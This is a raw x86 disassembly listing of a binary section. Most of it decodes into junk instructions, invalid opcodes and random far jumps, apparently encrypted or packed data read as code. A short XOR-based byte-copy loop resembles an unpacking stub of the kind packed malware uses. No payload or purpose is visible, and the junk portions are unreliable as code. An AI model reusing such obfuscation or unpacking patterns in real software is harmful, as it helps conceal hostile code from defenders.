  4031a1:	xlat   BYTE PTR ds:[ebx]
  4031a2:	jo     0x4031de
  4031a4:	adc    al,BYTE PTR [ecx+0x2605c66a]
  4031aa:	inc    ebp
  4031ab:	(bad)  
  4031ac:	mov    dh,BYTE PTR [edx+0x3c385e38]
  4031b2:	cmp    eax,0x87d71db8
  4031b7:	das    
  4031b8:	loop   0x403197
  4031ba:	sar    BYTE PTR [esi-0xb9a2f02],0x6b
  4031c1:	cld    
  4031c2:	(bad)  
  4031c3:	shl    DWORD PTR [ecx-0x3],1
  4031c6:	retf   
  4031c7:	mov    ?,WORD PTR [ebx]
  4031c9:	outs   dx,DWORD PTR ds:[esi]
  4031ca:	inc    ebp
  4031cb:	stos   DWORD PTR es:[edi],eax
  4031cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031cd:	xor    BYTE PTR [edx-0x51004acc],bh
  4031d3:	les    ecx,FWORD PTR [edx-0x15]
  4031d6:	fild   QWORD PTR [esp+eiz*4+0x1999411a]
  4031dd:	cs dec edx
  4031df:	add    BYTE PTR [ecx],0x5d
  4031e2:	adc    edi,DWORD PTR [edi+0x74]
  4031e5:	inc    ebx
  4031e6:	arpl   WORD PTR [ecx+0x32606441],si
  4031ec:	fimul  DWORD PTR [ebx]
  4031ee:	and    bl,BYTE PTR [eax+0x7664736b]
  4031f4:	fstp   QWORD PTR [edi]
  4031f6:	and    DWORD PTR [esi+0x4d657c0c],esp
  4031fc:	dec    eax
  4031fd:	nop
  4031fe:	inc    esp
  4031ff:	rcl    ecx,cl
  403201:	test   eax,0xd0bc8fce
  403206:	mov    al,0x9
  403208:	sbb    DWORD PTR [edi+0x50323dcb],0x2804564f
  403212:	cli    
  403213:	stos   BYTE PTR es:[edi],al
  403214:	fnstcw WORD PTR [ecx]
  403216:	jb     0x40323c
  403218:	into   
  403219:	loopne 0x403291
  40321b:	mov    ecx,0x8ef93486
  403220:	shr    dl,1
  403222:	mov    al,0xd3
  403224:	jecxz  0x40320b
  403226:	shl    DWORD PTR [edi],0x77
  403229:	mov    ebx,0xa9cd6d4e
  40322e:	out    dx,al
  40322f:	xchg   ebx,ecx
  403231:	clc    
  403232:	or     al,0xee
  403234:	and    DWORD PTR [ebx],ecx
  403236:	push   ebp
  403237:	dec    edx
  403238:	adc    ebp,DWORD PTR ds:0x5a22e4c1
  40323e:	cmp    al,0xd9
  403241:	jl     0x4032bc
  403243:	xor    dl,ch
  403245:	xor    eax,esi
  403247:	hlt    
  403248:	out    0x32,eax
  40324a:	cmp    ebx,0xd2112d0c
  403250:	aaa    
  403251:	mov    ebx,0xe93e700b
  403256:	retf   0x18c0
  403259:	pop    esi
  40325a:	xlat   BYTE PTR ds:[ebx]
  40325b:	and    BYTE PTR [ebx-0x2f],bh
  40325e:	mov    WORD PTR [ecx-0x1ba77b2f],ss
  403264:	cmp    al,0x78
  403266:	and    eax,0xd0cd848a
  40326b:	mov    bh,0xc8
  40326d:	mov    ds:0x149f8953,al
  403272:	mov    ds:0x6c888ef1,eax
  403277:	xchg   ecx,eax
  403278:	int    0x71
  40327a:	and    esi,esp
  40327c:	or     al,0x97
  40327e:	sar    BYTE PTR [esi-0x47],cl
  403281:	sahf   
  403282:	icebp  
  403283:	jnp    0x40326e
  403285:	jb     0x403224
  403287:	pop    es
  403288:	scas   al,BYTE PTR es:[edi]
  403289:	xor    dl,BYTE PTR [eax+eax*4-0x34bb25e]
  403290:	dec    esi
  403291:	pop    edi
  403292:	ds test eax,0x7ff1bd9c
  403298:	adc    eax,0x7096e3b
  40329d:	retf   
  40329e:	cmp    al,0x4f
  4032a0:	inc    edi
  4032a1:	xchg   ecx,eax
  4032a2:	ja     0x403260
  4032a4:	mov    dl,0x35
  4032a6:	push   0x859f2d3b
  4032ab:	jb     0x40322d
  4032ad:	cmp    edx,DWORD PTR [ebp-0x5b2eaa70]
  4032b3:	mov    ch,0xe2
  4032b5:	hlt    
  4032b6:	mov    ch,al
  4032b8:	ins    DWORD PTR es:[edi],dx
  4032b9:	mov    es,WORD PTR [esp+eax*4]
  4032bc:	or     ah,cl
  4032be:	and    al,al
  4032c0:	or     al,cl
  4032c2:	push   es
  4032c3:	(bad)  
  4032c4:	push   ebp
  4032c5:	pop    esi
  4032c6:	xchg   DWORD PTR [edi+0x74],ecx
  4032c9:	stos   BYTE PTR es:[edi],al
  4032ca:	jo     0x4032e2
  4032cc:	adc    DWORD PTR [ebx-0x7749b9b6],0x5c56cbd2
  4032d6:	ret    
  4032d7:	adc    al,dh
  4032d9:	pusha  
  4032da:	mov    dl,0xae
  4032dc:	cs inc ecx
  4032de:	fwait
  4032df:	pop    es
  4032e0:	adc    al,0xb5
  4032e2:	adc    esp,DWORD PTR [ecx-0x639580b8]
  4032e8:	shl    BYTE PTR [ebx+0x74],cl
  4032eb:	inc    ebx
  4032ec:	sub    DWORD PTR [edi+0x65f50bfd],edx
  4032f2:	dec    edi
  4032f3:	jecxz  0x4032b2
  4032f5:	hlt    
  4032f6:	clc    
  4032f7:	(bad)  [ebp+0x21]
  4032fa:	xchg   edi,eax
  4032fb:	fimul  WORD PTR [ebx+0x6]
  4032fe:	mov    ecx,0xeb7c0405
  403303:	ja     0x4032a8
  403305:	lods   al,BYTE PTR ds:[esi]
  403306:	(bad)  
  403307:	jmp    0x4f98:0x84b95629
  40330e:	leave  
  40330f:	stos   BYTE PTR es:[edi],al
  403310:	mov    BYTE PTR [edx],ch
  403312:	mov    ds:0x760f3380,al
  403317:	lods   eax,DWORD PTR ds:[esi]
  403318:	test   al,0x16
  40331a:	fisub  WORD PTR [edi]
  40331c:	and    dh,al
  40331e:	pop    esp
  40331f:	push   ebp
  403320:	xor    BYTE PTR [edi],dh
  403322:	mov    eax,DWORD PTR [eax+0x477aa8ac]
  403328:	fs xor al,0xcc
  40332b:	mov    ds:0x52b38a3,al
  403330:	cmp    DWORD PTR [edi],esi
  403332:	es cdq 
  403334:	push   edi
  403335:	mov    BYTE PTR [ebx-0x7c9747b8],al
  40333b:	ret    0xb712
  40333e:	pop    eax
  40333f:	mov    WORD PTR [ecx+0x60],ss
  403342:	adc    BYTE PTR [edi],ah
  403344:	xchg   BYTE PTR [esi+0x56977a4a],dl
  40334a:	fild   QWORD PTR [edx-0x1c956413]
  403350:	scas   eax,DWORD PTR es:[edi]
  403351:	jae    0x403332
  403353:	fnstenv [ebx]
  403355:	mov    WORD PTR [edi+0x13392d99],?
  40335b:	mov    bh,0x4d
  40335d:	pushf  
  40335e:	jno    0x4033a4
  403360:	iret   
  403361:	mov    al,0x53
  403363:	mov    edx,0xf0278ffb
  403368:	mov    al,0x89
  40336a:	adc    DWORD PTR [ebp-0x73],edx
  40336d:	and    ah,bh
  40336f:	scas   al,BYTE PTR es:[edi]
  403370:	loop   0x403392
  403372:	xchg   esp,eax
  403373:	add    al,0xd4
  403375:	int3   
  403376:	add    BYTE PTR [esi-0x6a30d654],bl
  40337c:	sbb    DWORD PTR [eax],ecx
  40337e:	push   DWORD PTR [esi-0x2f]
  403381:	int3   
  403382:	add    bl,BYTE PTR [edi]
  403384:	popf   
  403385:	cmp    BYTE PTR [ebp+0x38],dh
  403388:	jecxz  0x4033df
  40338a:	adc    al,0x7d
  40338c:	enter  0x5cc1,0x5c
  403390:	ja     0x40334d
  403392:	cmp    ebx,edi
  403394:	out    0x76,al
  403396:	xchg   DWORD PTR [ebx-0x745c2d92],ecx
  40339c:	jne    0x4033a6
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	fwait
  4033ba:	pop    edx
  4033bb:	adc    BYTE PTR [ebx+0x3a],0x14
  4033bf:	jo     0x403431
  4033c1:	mov    esi,0xc570707e
  4033c6:	imul   edx,DWORD PTR [eax+0x64b12a6a],0xb5cb7c40
  4033d0:	inc    eax
  4033d1:	mov    ebx,0x57aaf14f
  4033d6:	shr    dl,0xee
  4033d9:	push   ds
  4033da:	adc    ch,bh
  4033dc:	cld    
  4033dd:	add    DWORD PTR [esi],0x3d4ecbe9
  4033e3:	lds    ebx,FWORD PTR [ebx+0x64]
  4033e6:	mov    BYTE PTR [ebx-0x6d],dh
  4033e9:	jle    0x4033bf
  4033eb:	mov    al,ds:0x1394f120
  4033f0:	pop    edi
  4033f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033f2:	fld    DWORD PTR [edx-0x3580b45b]
  4033f8:	mov    bh,cl
  4033fa:	cmp    al,0x7
  4033fc:	sbb    DWORD PTR [ebp+0x4b],0xfffffffe
  403400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403401:	(bad)  
  403402:	in     eax,0xb9
  403404:	cld    
  403405:	cwde   
  403406:	(bad)  
  403407:	adc    al,0xad
  403409:	pushf  
  40340a:	mov    dl,0x5e
  40340c:	mov    ds:0xea1d5bf,al
  403411:	shr    BYTE PTR [edx-0x69],0x77
  403415:	cmp    DWORD PTR [ecx],edi
  403417:	jp     0x403454
  403419:	sar    BYTE PTR [esi],1
  40341b:	sub    esp,edx
  40341d:	popf   
  40341e:	in     eax,dx
  40341f:	adc    eax,0x6fc1bdb4
  403424:	mov    al,ds:0x353e7640
  403429:	xor    bh,0xfb
  40342c:	sahf   
  40342d:	adc    edi,edi
  40342f:	test   al,0x64
  403431:	pop    edx
  403432:	test   al,0xd0
  403435:	adc    bh,BYTE PTR ds:0x21d71866
  40343b:	push   ecx
  40343c:	xchg   edi,eax
  40343d:	bswap  esp
  40343f:	xchg   ecx,eax
  403440:	sbb    al,BYTE PTR [esi+0x5]
  403443:	xor    eax,0x90919ff9
  403448:	pushf  
  403449:	sub    cl,BYTE PTR [edx+0x70]
  40344c:	mov    DWORD PTR [edx-0x66],ebp
  40344f:	ret    
  403450:	adc    DWORD PTR [eax],esp
  403452:	pop    ss
  403453:	shl    BYTE PTR [ebp+0x6],cl
  403456:	fwait
  403457:	popf   
  403458:	sti    
  403459:	pushf  
  40345a:	add    cl,BYTE PTR [ecx-0xa]
  40345d:	in     al,dx
  40345e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40345f:	adc    bl,BYTE PTR [ebp-0xe99d460]
  403465:	test   BYTE PTR [edx+0x13],0xbe
  403469:	pop    edx
  40346a:	mov    dh,0xbf
  40346c:	cld    
  40346d:	lea    esi,[edx+0x1e2c18c1]
  403473:	push   esp
  403474:	or     BYTE PTR [edx+esi*2+0x295300f8],dl
  40347b:	movd   DWORD PTR [ebp+0x95fc633],mm7
  403482:	xchg   edi,eax
  403483:	arpl   WORD PTR [ebx+0x5399c81e],si
  403489:	jge    0x403411
  40348b:	xchg   esi,eax
  40348c:	mov    ebx,0xdeb6ba54
  403491:	mov    ds:0xd6df02b4,eax
  403496:	inc    ebp
  403497:	cli    
  403498:	xor    eax,0xef8eb4e8
  40349d:	mov    esi,0xca162fd0
  4034a2:	fwait
  4034a3:	cmp    eax,DWORD PTR [esi+0x14da1982]
  4034a9:	push   cs
  4034aa:	jp     0x403520
  4034ac:	gs stc 
  4034ae:	bnd jmp 0x4034fd
  4034b1:	jne    0x40352e
  4034b3:	into   
  4034b4:	repnz adc BYTE PTR ds:[edi],cl
  4034b8:	inc    edi
  4034b9:	push   ebx
  4034ba:	pop    es
  4034bb:	push   ebp
  4034bc:	mov    edi,0xa3e8b832
  4034c1:	call   0x92a4:0x97bed852
  4034c8:	jl     0x4034b8
  4034ca:	pop    edx
  4034cb:	shl    BYTE PTR [ebp+ecx*2-0x60],0x6b
  4034d0:	jbe    0x4034ec
  4034d2:	push   es
  4034d3:	rol    DWORD PTR [edx],cl
  4034d5:	mov    al,ds:0xaca3e59e
  4034da:	lock outs dx,DWORD PTR ds:[esi]
  4034dc:	push   0x4e8ad1e9
  4034e1:	jns    0x40349d
  4034e3:	jp     0x40354b
  4034e5:	cdq    
  4034e6:	das    
  4034e7:	out    dx,al
  4034e8:	push   eax
  4034e9:	jg     0x403519
  4034eb:	test   BYTE PTR [edx-0x23],dh
  4034ee:	ins    BYTE PTR es:[edi],dx
  4034ef:	xchg   DWORD PTR [edx+0x6f],eax
  4034f2:	jl     0x40354e
  4034f4:	xchg   esi,eax
  4034f5:	mov    ah,0x3c
  4034f7:	fcom   DWORD PTR [esp+eax*2]
  4034fa:	cmp    DWORD PTR [esi-0x5d],ecx
  4034fd:	call   FWORD PTR [eax-0x70916ac4]
  403503:	cdq    
  403504:	cld    
  403505:	fdiv   DWORD PTR [eax]
  403507:	cmp    ebx,DWORD PTR [ecx-0x5a679f9e]
  40350d:	imul   edi,DWORD PTR [ecx-0x23],0xa4f1cf3c
  403514:	push   0xffffffde
  403516:	mov    al,0x94
  403518:	addr16 out 0x33,al
  40351b:	enter  0x2c59,0x7f
  40351f:	sti    
  403520:	jbe    0x403554
  403522:	add    al,0xdf
  403524:	and    al,0xa1
  403526:	push   esi
  403527:	or     BYTE PTR [eax],cl
  403529:	shr    DWORD PTR [edi+0x4c],0x91
  40352d:	adc    DWORD PTR [eax+0x77c57369],eax
  403533:	fcmovne st,st(1)
  403535:	dec    esp
  403536:	es and al,0x89
  403539:	sahf   
  40353a:	cmp    al,0x77
  40353c:	jae    0x40353e
  40353e:	in     al,0x12
  403540:	ss fucomip st,st(6)
  403543:	loopne 0x40350a
  403545:	outs   dx,DWORD PTR ds:[esi]
  403546:	nop
  403547:	xor    DWORD PTR [ecx-0x79],ebp
  40354a:	adc    eax,0xd160921b
  40354f:	adc    edi,DWORD PTR [ebp+edi*2+0x63fbe5c8]
  403556:	add    esp,eax
  403558:	jo     0x4035b6
  40355a:	mov    eax,0xbde7e928
  40355f:	js     0x4035c8
  403561:	lahf   
  403562:	and    cl,cl
  403564:	das    
  403565:	js     0x4035a3
  403567:	enter  0x40be,0x6c
  40356b:	stos   DWORD PTR es:[edi],eax
  40356c:	(bad)  
  40356d:	pop    ecx
  40356e:	imul   esp,DWORD PTR [ecx],0xa48bbe5c
  403574:	sbb    al,0x52
  403576:	jbe    0x4035bb
  403578:	fcom   DWORD PTR [edx+0x3a]
  40357b:	ret    
  40357c:	jbe    0x4035b5
  40357e:	xor    eax,0xa83c96da
  403583:	mov    esi,0x1097a7dc
  403588:	or     BYTE PTR [ebp+ebx*8-0x1f],ah
  40358c:	dec    esp
  40358d:	mov    ?,WORD PTR [ebx]
  40358f:	mov    ss,WORD PTR [eax]
  403591:	retf   
  403592:	bound  ebx,QWORD PTR [edi-0x1d]
  403595:	mov    dh,0xb2
  403597:	inc    ebp
  403598:	test   DWORD PTR [ebx-0x5d785074],eax
  40359e:	fs inc ecx
  4035a0:	jecxz  0x40355b
  4035a2:	pushf  
  4035a3:	xor    ah,BYTE PTR es:[eax+0x5087a258]
  4035aa:	add    bh,dh
  4035ac:	(bad)  
  4035ad:	and    al,0x88
  4035af:	pop    ss
  4035b0:	dec    edi
  4035b1:	sub    bh,BYTE PTR [ecx-0x66]
  4035b4:	outs   dx,BYTE PTR ds:[esi]
  4035b5:	sbb    edi,ebp
  4035b7:	jb     0x403578
  4035b9:	dec    esp
  4035ba:	cld    
  4035bb:	push   0x94e24140
  4035c0:	sub    BYTE PTR [ebx+0x23751e4e],dh
  4035c6:	cli    
  4035c7:	xchg   DWORD PTR [edi],esi
  4035c9:	sbb    eax,0x4a8f60e9
  4035ce:	into   
  4035cf:	mov    esi,DWORD PTR [ebx+0x28]
  4035d2:	int    0x57
  4035d4:	enter  0xcef1,0x45
  4035d8:	jnp    0x4035da
  4035da:	retf   0x7df1
  4035dd:	daa    
  4035de:	adc    ebx,DWORD PTR [esi+0x6fb2a7cf]
  4035e4:	in     eax,dx
  4035e5:	xlat   BYTE PTR ds:[ebx]
  4035e6:	retf   
  4035e7:	cmp    edi,ebx
  4035e9:	mov    ?,WORD PTR ds:0x49421c41
  4035ef:	pusha  
  4035f0:	adc    eax,0x7ea32231
  4035f5:	cmc    
  4035f6:	fwait
  4035f7:	and    esp,esp
  4035f9:	dec    esp
  4035fa:	out    dx,al
  4035fb:	jno    0x4035fe
  4035fd:	jle    0x403623
  4035ff:	das    
  403600:	adc    bh,cl
  403602:	sbb    esp,DWORD PTR [edx+0x622e294c]
  403608:	call   0xb50830ce
  40360d:	out    dx,al
  40360e:	mov    DWORD PTR ds:0xa0346465,esi
  403614:	test   DWORD PTR [esi-0x54],edx
  403617:	mov    ecx,0xeed266e3
  40361c:	stc    
  40361d:	mov    edx,0x611f6689
  403622:	add    al,BYTE PTR [edi-0x559f0332]
  403628:	add    al,BYTE PTR [edi-0x73a8bcc6]
  40362e:	int3   
  40362f:	ja     0x4035bb
  403631:	scas   eax,DWORD PTR es:[edi]
  403632:	jg     0x40365a
  403634:	fwait
  403635:	push   0xffffffc7
  403637:	ja     0x403652
  403639:	sub    BYTE PTR [ebx],cl
  40363b:	gs jl  0x403694
  40363e:	into   
  40363f:	pop    ebp
  403640:	out    dx,al
  403641:	mov    ch,BYTE PTR [ecx+0xe5a3057]
  403647:	lods   eax,DWORD PTR ds:[esi]
  403648:	mov    bl,0x4c
  40364a:	fst    st(6)
  40364c:	ds mov ?,ebp
  40364f:	jo     0x403617
  403651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403652:	scas   eax,DWORD PTR es:[edi]
  403653:	aad    0x2d
  403655:	sbb    BYTE PTR [esi+0x2278678f],ah
  40365b:	fsubr  st,st(4)
  40365d:	pop    esi
  40365e:	loop   0x40362e
  403660:	push   ebp
  403661:	lods   eax,DWORD PTR ds:[esi]
  403662:	or     bl,dl
  403664:	xchg   esp,eax
  403665:	dec    edi
  403666:	cmp    DWORD PTR [ebx+0xf],ebx
  403669:	inc    esp
  40366a:	mov    esp,0xe899d37a
  40366f:	add    BYTE PTR [esi],ah
  403671:	mov    ecx,0x57854d00
  403676:	inc    ebx
  403677:	sbb    eax,0xbc11dd63
  40367c:	cld    
  40367d:	and    al,0x88
  40367f:	dec    edi
  403680:	loop   0x4036e5
  403682:	mov    eax,0x8c695c2b
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [esp+ebp*2+0x117833ca],esp
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xea70707d
  4037ae:	(bad)  
  4037af:	xchg   ecx,eax
  4037b0:	cli    
  4037b1:	imul   ebp,DWORD PTR es:[ebp+0x61],0xd85cbe01
  4037b9:	test   DWORD PTR [ecx-0x5184ed5b],esp
  4037bf:	stos   BYTE PTR es:[edi],al
  4037c0:	fisub  WORD PTR [esi+ebp*8-0x48]
  4037c4:	cmp    BYTE PTR [esi+0x1cd89211],dl
  4037ca:	or     ch,BYTE PTR [esi+0x158677d0]
  4037d0:	sub    eax,0xb312b7be
  4037d5:	or     ecx,ebx
  4037d7:	(bad)  
  4037d8:	(bad)
  4037dc:	mov    eax,0xeaf1f86e
  4037e1:	fwait
  4037e2:	in     al,0x5f
  4037e4:	stos   DWORD PTR es:[edi],eax
  4037e5:	test   DWORD PTR [ecx-0x2dbfc48f],eax
  4037eb:	or     eax,0x83972de4
  4037f0:	das    
  4037f1:	(bad)  
  4037f2:	fnsave [eax-0x4d]
  4037f5:	stos   BYTE PTR es:[edi],al
  4037f6:	call   0x2d8b2d15
  4037fb:	cmp    dh,BYTE PTR [edi+0x5e]
  4037fe:	mov    edx,0x406a8eef
  403803:	mov    esp,0x685a470b
  403808:	enter  0x6f1b,0x3d
  40380c:	pop    ebx
  40380d:	jmp    0x40381a
  40380f:	nop
  403810:	scas   al,BYTE PTR es:[edi]
  403811:	pop    es
  403812:	mov    esp,0x7fefbaeb
  403817:	lahf   
  403818:	add    BYTE PTR [edi],dh
  40381a:	jno    0x40384c
  40381c:	lock (bad) 
  40381e:	jle    0x40385b
  403820:	pop    ebp
  403821:	out    dx,al
  403822:	aaa    
  403823:	add    BYTE PTR [ecx+0x772815f1],ah
  403829:	rcl    al,cl
  40382b:	shl    BYTE PTR [ebx],1
  40382d:	(bad)  [ebx+ecx*8-0x47]
  403831:	or     BYTE PTR [ecx-0x75],ah
  403834:	mov    ebp,0x2c8826e6
  403839:	sub    ecx,DWORD PTR [eax-0x36b807b7]
  40383f:	inc    BYTE PTR [ebx+0x3c93abc6]
  403845:	test   eax,0x51e70eb9
  40384a:	fucom  st(7)
  40384c:	lahf   
  40384d:	fld    DWORD PTR [ebp-0x9]
  403850:	dec    esp
  403851:	xchg   ebp,eax
  403852:	imul   ebx,DWORD PTR [ecx+0xc0c20],0xaeb67198
  40385c:	pop    ss
  40385d:	cli    
  40385e:	ret    0xd55d
  403861:	inc    ebx
  403862:	push   esi
  403863:	xor    DWORD PTR [ebx],esp
  403865:	or     DWORD PTR [ebx-0x5d5bf709],edi
  40386b:	xchg   bl,dl
  40386d:	push   edi
  40386e:	mov    eax,0x3c97beeb
  403873:	adc    al,0xdf
  403875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403876:	sub    ah,bh
  403878:	push   ss
  403879:	enter  0x3314,0xdc
  40387d:	repz arpl WORD PTR [edi-0xcb2b70b],ax
  403884:	out    0xac,al
  403886:	dec    esp
  403887:	sub    eax,0x31b11e30
  40388c:	call   0xbd85b3dd
  403891:	sub    DWORD PTR [esi+0x6f4b01a5],esi
  403897:	push   edx
  403898:	pop    es
  403899:	sahf   
  40389a:	sub    al,0xcb
  40389c:	xor    cl,0xda
  40389f:	and    dh,ch
  4038a1:	ror    DWORD PTR [eax-0x5d],cl
  4038a4:	dec    ecx
  4038a5:	es mov dh,0xd6
  4038a8:	loop   0x40388f
  4038aa:	adc    al,0x17
  4038ac:	in     al,0x1a
  4038ae:	push   ds
  4038af:	das    
  4038b0:	xchg   esi,eax
  4038b1:	lods   al,BYTE PTR ds:[esi]
  4038b2:	dec    esi
  4038b3:	cmovnp ebp,esp
  4038b6:	cmp    al,0x92
  4038b8:	mov    esp,0x9b96e179
  4038bd:	add    bh,BYTE PTR [edi+0x2e321141]
  4038c3:	test   DWORD PTR [ebp+0x16],eax
  4038c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c7:	inc    edx
  4038c8:	push   eax
  4038c9:	push   0xc402d4f1
  4038ce:	push   ebx
  4038cf:	add    al,0x8a
  4038d1:	imul   eax,DWORD PTR [ebx-0x69c72377],0xa94d4d85
  4038db:	lock xchg esp,eax
  4038dd:	js     0x403891
  4038df:	xor    DWORD PTR [edi+edi*4-0x53d0b61a],ecx
  4038e6:	nop
  4038e7:	or     eax,DWORD PTR [ecx*2+0x5a2df5f8]
  4038ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ef:	pop    ebx
  4038f0:	mov    al,ds:0xf77a3abd
  4038f5:	popa   
  4038f6:	(bad)
  4038f9:	xchg   ebp,eax
  4038fa:	mov    ds:0xec748f90,al
  4038ff:	(bad)  [ebx]
  403901:	adc    esi,DWORD PTR [eax]
  403903:	jecxz  0x40394f
  403905:	test   al,ah
  403907:	imul   eax,DWORD PTR [eax+0x14eb1aa5],0xffffffac
  40390e:	mov    al,ds:0xa263c343
  403913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403914:	fucomi st,st(1)
  403916:	sahf   
  403917:	jle    0x4038b6
  403919:	fs (bad) 
  40391b:	pop    ebx
  40391c:	(bad)  
  40391e:	pusha  
  40391f:	out    0x63,eax
  403921:	mov    edx,0xd2e8d485
  403926:	lock pop ebp
  403928:	jl     0x40390a
  40392a:	nop
  40392b:	pop    eax
  40392c:	and    al,BYTE PTR [ebx+0x59ccff42]
  403932:	add    ah,0x9
  403935:	cmp    ebx,DWORD PTR [ecx]
  403937:	ficomp WORD PTR [ebx+0x11acb2cd]
  40393d:	ds fwait
  40393f:	mov    gs:0xd87303fa,eax
  403945:	pop    edi
  403946:	ror    ebp,cl
  403948:	sub    bh,bl
  40394a:	clc    
  40394b:	cld    
  40394c:	sbb    DWORD PTR [ebx+0x7f],esp
  40394f:	cmp    eax,0x156f6c32
  403954:	mov    esp,?
  403956:	mov    edi,0x93ed27da
  40395b:	push   cs
  40395c:	jne    0x403940
  40395e:	xchg   ebx,eax
  40395f:	mov    al,0xa1
  403961:	sbb    BYTE PTR [edx],bl
  403963:	ja     0x403978
  403965:	test   al,0x32
  403967:	fucomip st,st(6)
  403969:	jg     0x403941
  40396b:	mov    ah,0xc4
  40396d:	mov    WORD PTR [ebp-0x21],ds
  403970:	and    eax,0xff18c26e
  403975:	imul   esp,DWORD PTR [eax],0x67b058f1
  40397b:	gs jnp 0x4039c1
  40397e:	dec    ecx
  40397f:	sub    DWORD PTR [esi+0x63],ebp
  403982:	pop    edx
  403983:	cmp    ebp,DWORD PTR [eax-0x65]
  403986:	sbb    dl,BYTE PTR [edx]
  403988:	inc    edx
  403989:	lods   al,BYTE PTR ds:[esi]
  40398a:	test   BYTE PTR [edi],0xc1
  40398d:	xchg   esi,eax
  40398e:	pushf  
  40398f:	lods   al,BYTE PTR ds:[esi]
  403990:	js     0x403989
  403992:	jmp    0xf0bd:0xaf6459e2
  403999:	and    BYTE PTR [eax],bh
  40399b:	pop    esp
  40399c:	and    eax,0x9446780a
  4039a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a2:	jmp    0xedd7:0x1293783e
  4039a9:	push   esp
  4039aa:	aas    
  4039ab:	adc    BYTE PTR [ebx],bh
  4039ad:	or     BYTE PTR [edx+eiz*2-0x25],dh
  4039b1:	and    ecx,DWORD PTR [eax]
  4039b3:	adc    eax,0xec8d3131
  4039b8:	in     al,0xde
  4039ba:	mov    al,ds:0x52eb2a26
  4039bf:	test   edx,ecx
  4039c1:	and    DWORD PTR [edi-0x3b71d84b],ebx
  4039c7:	jo     0x403a12
  4039c9:	pushf  
  4039ca:	and    DWORD PTR [edx-0x2db9cabb],edi
  4039d0:	cmp    DWORD PTR [ecx],esi
  4039d2:	in     al,dx
  4039d3:	dec    eax
  4039d4:	and    BYTE PTR [eax-0x64c8987b],bh
  4039da:	mov    cx,0xebc0
  4039de:	stos   DWORD PTR es:[edi],eax
  4039df:	sbb    esi,eax
  4039e1:	sub    DWORD PTR [eax],edi
  4039e3:	retf   0xa7ad
  4039e6:	sub    edx,ebx
  4039e8:	jg     0x403a06
  4039ea:	push   ss
  4039eb:	inc    eax
  4039ec:	ins    BYTE PTR es:[edi],dx
  4039ed:	aaa    
  4039ee:	iret   
  4039ef:	sub    DWORD PTR [edi+0x79],0x79d7dc7b
  4039f6:	sub    edx,DWORD PTR [edi]
  4039f8:	sub    DWORD PTR [esi+0xb],0xef53e1d7
  4039ff:	dec    edx
  403a00:	inc    ecx
  403a01:	loopne 0x4039c7
  403a03:	jo     0x403a83
  403a05:	out    0x1e,eax
  403a07:	into   
  403a08:	mov    esp,0x7b8965d2
  403a0d:	popf   
  403a0e:	out    0x86,al
